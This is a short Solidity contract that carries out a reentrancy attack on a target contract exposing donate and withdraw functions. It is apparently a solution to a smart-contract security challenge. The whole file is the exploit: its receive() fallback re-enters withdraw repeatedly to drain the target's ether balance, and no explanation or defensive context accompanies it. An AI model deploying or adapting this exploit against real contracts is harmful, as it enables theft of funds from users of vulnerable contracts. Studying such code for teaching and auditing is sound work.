// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Reenter {
    address public owner;
    IReentrance targetContract;
    uint256 targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue, "not enough amount");
        targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    receive() external payable {
        if (address(targetContract).balance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}
